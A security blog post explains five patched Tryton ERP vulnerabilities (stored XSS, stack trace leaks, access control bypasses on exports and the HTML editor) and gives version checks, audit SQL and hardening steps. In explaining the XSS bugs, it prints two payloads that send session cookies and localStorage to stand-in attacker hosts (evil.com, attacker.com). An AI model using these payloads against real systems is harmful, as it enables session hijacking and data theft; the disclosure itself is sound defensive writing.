---
title: "Five CVEs in Tryton ERP: Stored XSS, Broken Access Controls, and Server Info Leaks"
description: "Five CVEs disclosed in Tryton ERP through responsible disclosure -- stored XSS that escalates to unauthenticated via email, access control bypasses on data exports, and stack traces handed to any logged-in user. All patched, all basic, all in production for years."
date: "2026-03-08"
tags: ["xss", "erp", "tryton", "cve-2025-66420", "cve-2025-66421", "cve-2025-66422", "access-control"]
---

Five CVEs just dropped for Tryton, an open-source ERP platform that businesses use to manage accounting, inventory, sales, and customer data. The vulnerabilities were discovered by [Brandon Da Costa](https://www.linkedin.com/in/brandon-da-costa/), [Mahdi Afshar](https://www.linkedin.com/in/mahdi-afshar-b43a39264/), and [Abdulfatah Abdillahi](https://www.linkedin.com/in/abdulfatah-abdillahi/) -- cybersecurity students at Seneca Polytechnic and members of the [Cyber Cafe](https://www.linkedin.com/company/cyber-café-club/) security club. Seneca's cybersecurity program includes dedicated web security (WEB600) and security assessment (RIS602) courses, so this kind of research is exactly what the program produces. The findings were reported through [Tryton's bug tracker](https://foss.heptapod.net/tryton/tryton) as part of responsible disclosure.

The bugs themselves are textbook web application failures: stored cross-site scripting, missing access controls on data exports, and server stack traces leaking infrastructure details to anyone with a login.

Tryton has been around since 2008, forked from the codebase that became Odoo. It handles invoices, payroll records, customer databases, and financial reports. And until November 2025, a low-privileged user could steal admin sessions through a crafted HTML attachment, export data they shouldn't have access to, or fingerprint the entire server stack through error messages.

Five CVEs. All basic. All in production for years.

## The Vulnerabilities

Here's what was reported across two coordinated disclosures:

**CVE-2025-66420 -- Stored XSS via HTML Attachments (CVSS 7.3)**

Tryton's web client (SAO) renders HTML attachments inline without sanitization. Upload an HTML file with embedded JavaScript, and it executes in the application's security context when any user previews it.

Any authenticated user can upload attachments. That means any employee with basic Tryton access can plant a payload that fires when a manager, admin, or accountant opens it. The JavaScript runs with the victim's session, giving the attacker access to everything that user can see and do.

It gets worse. If the `inbound_email` and `document_incoming` modules are enabled -- which convert incoming emails into Tryton documents automatically -- the CVSS jumps to 8.1. An unauthenticated attacker can send a malicious HTML email to the company's Tryton inbox, and the payload detonates when anyone views the resulting document. No login required. Just an email address.

**CVE-2025-66421 -- Stored XSS via Completion Values (CVSS 7.3)**

SAO's autocomplete fields don't escape their values. These completion values are typically record names -- party names, product names, project titles -- that can be edited through various models in the system.

Set a customer name to `<img src=x onerror="document.location='https://evil.com/steal?c='+document.cookie">` and every user who triggers the autocomplete on that record executes the payload. The JavaScript runs in SAO's context with full access to the victim's session.

This is XSS 101. Unescaped user input rendered in the DOM. In an ERP system. In 2025.

**CVE-2025-66422 -- Server Stack Trace Information Disclosure (CVSS 4.3)**

When trytond hits an unexpected error, it sends the full Python stack trace back to the client. Any authenticated user can trigger this by sending a malformed JSON-RPC request -- for example, submitting unknown fields to the `model.party.party.create` endpoint.

The stack trace reveals:
- Server file paths and directory structure
- Python version and installed packages
- Database configuration details
- Internal module names and function signatures
- Framework internals and middleware stack

This is a reconnaissance goldmine. An attacker mapping the server before a real exploit gets the full blueprint handed to them in an error response.

**CVE-2025-66423 -- HTML Editor Route Access Bypass (CVSS 7.1)**

trytond doesn't enforce access rights on the HTML editor route. Any authenticated user can access the HTML editor regardless of their configured permissions, potentially reading or modifying content they shouldn't touch. High confidentiality impact, low integrity impact -- meaning data leaks are the primary risk.

**CVE-2025-66424 -- Data Export Access Bypass (CVSS 6.5)**

trytond doesn't enforce access rights for data exports. A user with low-level privileges can export data from any model, bypassing the access control rules that are supposed to restrict what they can see.

In an ERP system, "data export" means customer lists, financial records, employee information, pricing data, inventory counts -- everything the business considers confidential. The access controls exist in the UI, but the export endpoint ignores them entirely.

## How The XSS Attacks Work

The two stored XSS vulnerabilities (CVE-2025-66420 and CVE-2025-66421) share the same fundamental flaw: SAO trusts content it shouldn't.

### Attachment XSS (CVE-2025-66420)

**Step 1:** Attacker uploads an HTML file as an attachment to any Tryton record (invoice, purchase order, support ticket, etc.)

**Step 2:** The HTML file contains embedded JavaScript:

```html
<html>
<body>
<h1>Q4 Financial Summary</h1>
<script>
  // Steal session and send to attacker
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      url: window.location.href,
      localStorage: JSON.stringify(localStorage)
    })
  });
</script>
</body>
</html>
```

**Step 3:** When any user clicks to preview the attachment, SAO renders the HTML directly. The JavaScript executes in the application's origin, with access to the victim's session cookies, localStorage, and full DOM.

**Step 4:** With a stolen session, the attacker can impersonate the victim -- approve transactions, modify records, export data, or escalate privileges.

The email vector (with `inbound_email` + `document_incoming`) is even simpler. Send the HTML as an email. Tryton automatically ingests it. Someone opens it. Payload fires. No authentication needed on the attacker's side.

### Completion Value XSS (CVE-2025-66421)

**Step 1:** Attacker modifies a record name to include JavaScript. In Tryton, record names are used as completion values in autocomplete fields across the application.

**Step 2:** Any user typing in a field that autocompletes against that record triggers the payload. SAO renders the completion value without escaping, so the JavaScript executes.

**Step 3:** Same impact as above -- session theft, data exfiltration, privilege escalation.

The attack surface here is broad. Party names, product names, project titles, category names -- anything that appears in a completion dropdown is a potential injection point.

## Why This Matters

Tryton commands roughly 0.1% of the ERP market, with around 100+ companies using it across the US, Europe, and Latin America. Small numbers. But ERP systems are high-value targets by nature. They're the central nervous system of a business -- every financial transaction, every customer record, every employee detail flows through them.

### ERP Systems Are Crown Jewel Targets

A compromised ERP gives attackers:
- **Financial data** -- invoices, payment records, bank details, tax filings
- **Customer PII** -- names, addresses, contact info, purchase history
- **Employee records** -- payroll, SSNs, benefits, performance reviews
- **Business intelligence** -- pricing strategies, vendor terms, inventory levels
- **Operational control** -- ability to modify orders, approve payments, alter records

One stored XSS payload in a Tryton instance could give an attacker persistent access to all of this through session hijacking.

### The Access Control Failures Are Worse Than The XSS

CVE-2025-66423 and CVE-2025-66424 are arguably more dangerous in practice. The XSS bugs require a victim to click something. The access control bypasses don't. Any authenticated user -- including that intern with read-only access -- can silently export the entire customer database or access the HTML editor's content. No social engineering required. No payloads to craft. Just call the endpoint.

These bugs existed since Tryton 6.0. That's years of deployments running with access controls that look correct in the UI but don't actually work on the backend.

### Open-Source ERP Security Is Under-Audited

Tryton's security posture isn't uniquely bad. It's representative. Small open-source ERP platforms rarely get the security scrutiny that Odoo, SAP, or Oracle get. They're maintained by small teams, used by companies that chose them specifically to avoid enterprise pricing, and audited approximately never.

Credit where it's due: the researchers disclosed responsibly through Tryton's bug tracker, and Tryton's maintainers responded quickly -- assigned CVEs, shipped patches, published advisories. That's how the process is supposed to work. But the fact that these bugs sat in production across four major release series for years says something about how little independent security attention small ERP platforms get relative to the sensitivity of data they handle.

## Affected Versions

All five CVEs affect multiple Tryton release series going back to version 6.0:

| CVE | Component | Fixed In | CVSS |
|-----|-----------|----------|------|
| CVE-2025-66420 | sao | 7.6.9, 7.4.19, 7.0.38, 6.0.67 | 7.3 |
| CVE-2025-66421 | sao | 7.6.11, 7.4.21, 7.0.40, 6.0.69 | 7.3 |
| CVE-2025-66422 | trytond | 7.6.11, 7.4.21, 7.0.40, 6.0.70 | 4.3 |
| CVE-2025-66423 | trytond | 7.6.11, 7.4.21, 7.0.40, 6.0.70 | 7.1 |
| CVE-2025-66424 | trytond | 7.6.11, 7.4.21, 7.0.40, 6.0.70 | 6.5 |

If you're running any Tryton version below these patch levels, you're exposed to all five vulnerabilities simultaneously.

## Detection & Response

### Check Your Version

```bash
# Check trytond version
pip show trytond | grep Version

# Check sao version
pip show tryton-sao | grep Version
```

### Immediate Actions

**1. Patch now.** Update trytond and sao to the latest versions for your release series. All five CVEs have patches available.

**2. Audit attachments.** Search for HTML attachments uploaded to your Tryton instance. Any `.html` or `.htm` files should be reviewed for embedded scripts:

```sql
SELECT id, name, create_date, create_uid
FROM ir_attachment
WHERE name LIKE '%.html' OR name LIKE '%.htm';
```

**3. Review access logs.** Check for unusual data export activity, especially from low-privileged accounts. The access control bypasses (CVE-2025-66423 and CVE-2025-66424) leave traces in server logs if export operations are logged.

**4. Audit record names.** Look for records with HTML/JavaScript in their names (party names, product names). These could be dormant XSS payloads:

```sql
SELECT id, name FROM party_party WHERE name LIKE '%<script%' OR name LIKE '%onerror%';
SELECT id, name FROM product_product WHERE name LIKE '%<script%' OR name LIKE '%onerror%';
```

**5. Rotate sessions.** If you suspect exploitation, invalidate all active sessions and force password resets. Stolen sessions from XSS attacks remain valid until they expire.

### Long-Term Hardening

- **Content Security Policy**: Deploy CSP headers that block inline script execution. This mitigates stored XSS even if unescaped content reaches the DOM.
- **Reverse proxy filtering**: Use a WAF or reverse proxy (nginx, Apache mod_security) to strip script tags from responses as a defense-in-depth measure.
- **Principle of least privilege**: Limit Tryton user accounts to the minimum permissions needed. Fewer authenticated users means fewer potential XSS attackers and export abusers.
- **Disable unused modules**: If you don't need `inbound_email` and `document_incoming`, disable them. They expand the XSS attack surface to unauthenticated attackers.

## References

**Primary Sources:**
- [Security Release for Issue #14290 (CVE-2025-66420)](https://discuss.tryton.org/t/security-release-for-issue-14290/8895)
- [Security Release for Issue #14354 (CVE-2025-66422)](https://discuss.tryton.org/t/security-release-for-issue-14354/8950)
- [Security Release for Issue #14363 (CVE-2025-66421)](https://discuss.tryton.org/t/security-release-for-issue-14363/8951)
- [Security Release for Issue #14364 (CVE-2025-66423)](https://discuss.tryton.org/t/security-release-for-issue-14364/8952)
- [Security Release for Issue #14366 (CVE-2025-66424)](https://discuss.tryton.org/t/security-release-for-issue-14366/8953)

**NVD Entries:**
- [CVE-2025-66420 -- Stored XSS via HTML Attachments](https://nvd.nist.gov/vuln/detail/CVE-2025-66420)
- [CVE-2025-66421 -- Stored XSS via Completion Values](https://nvd.nist.gov/vuln/detail/CVE-2025-66421)
- [CVE-2025-66422 -- Stack Trace Information Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2025-66422)

**Bug Tracker:**
- [Tryton Issue #14290](https://foss.heptapod.net/tryton/tryton/-/issues/14290)
- [Tryton Issue #14354](https://foss.heptapod.net/tryton/tryton/-/issues/14354)
- [Tryton Issue #14363](https://foss.heptapod.net/tryton/tryton/-/issues/14363)

**Researchers:**
- Brandon Da Costa ([@f10ww](https://foss.heptapod.net/f10ww)) -- [LinkedIn](https://www.linkedin.com/in/brandon-da-costa/)
- Mahdi Afshar ([@Mahdi36](https://foss.heptapod.net/Mahdi36)) -- [LinkedIn](https://www.linkedin.com/in/mahdi-afshar-b43a39264/)
- Abdulfatah Abdillahi ([@Abdul123](https://foss.heptapod.net/Abdul123)) -- [LinkedIn](https://www.linkedin.com/in/abdulfatah-abdillahi/)
- [Cyber Cafe Club](https://www.linkedin.com/company/cyber-café-club/) -- Seneca Polytechnic

---

Five CVEs. All basic web security failures. All in production for years. Discovered through responsible disclosure, patched promptly, and a solid example of security research done right.

Patch your Tryton. And maybe ask who's actually auditing the ERP system your business runs on.
